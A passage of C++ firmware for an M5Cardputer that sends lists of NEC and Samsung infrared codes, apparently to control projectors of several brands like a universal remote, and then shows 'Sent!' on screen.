    }
    NimBLEDevice::deinit(true);
}

void sendProjectorCode(int action) {
    uint32_t nec_codes[15];
    int nec_count = 0;
    uint32_t samsung_codes[3];
    int samsung_count = 0;

    if (action == 0) {
        uint32_t codes[] = {
            0x080BF4, 0x0101FE, 0x021DE2, 0x031DE2, 0x2041BE,
            0x31916E, 0x3202FD, 0x322ED1, 0x8600FF, 0xB80CF3, 0xFFE817
        };
        memcpy(nec_codes, codes, sizeof(codes));
        nec_count = sizeof(codes) / sizeof(codes[0]);
        samsung_codes[0] = 0x07E6;
        samsung_count = 1;
    } else if (action == 1) {
        uint32_t codes[] = {
            0x0848B7, 0x0128D7, 0x0248B7, 0x2051AE, 0x31D02F,
            0x328C73, 0x8630CF, 0xB81FE0, 0xFFBD42
        };
        memcpy(nec_codes, codes, sizeof(codes));
        nec_count = sizeof(codes) / sizeof(codes[0]);
        samsung_codes[0] = 0x0707;
        samsung_count = 1;
    } else if (action == 2) {
        uint32_t codes[] = {
            0x0849B6, 0x0129D6, 0x0240BF, 0x2056A9,
            0x328F70, 0x8631CE, 0xB81EE1, 0xFFF20D
        };
        memcpy(nec_codes, codes, sizeof(codes));
        nec_count = sizeof(codes) / sizeof(codes[0]);
        samsung_codes[0] = 0x070B;
        samsung_count = 1;
    } else if (action == 3) {
        uint32_t codes[] = {
            0x0814EB, 0x0102FD, 0x0218E7, 0x205AA5, 0x318976,
            0x3252AD, 0x8632CD, 0xB80DF2
        };
        memcpy(nec_codes, codes, sizeof(codes));
        nec_count = sizeof(codes) / sizeof(codes[0]);
        samsung_codes[0] = 0x070F;
        samsung_count = 1;
    } else {
        return;
    }

    for (int i = 0; i < nec_count; i++) {
        irsend.sendNEC(nec_codes[i], 32);
        delay(30);
    }
    for (int i = 0; i < samsung_count; i++) {
        irsend.sendSAMSUNG(samsung_codes[i], 32);
        delay(30);
    }

    M5Cardputer.Display.setTextColor(ACCENT_COLOR, BG_COLOR);
    M5Cardputer.Display.setCursor(10, SCREEN_H - 12);
    M5Cardputer.Display.print("Sent!");
    delay(300);
    needsRedraw = true;
}
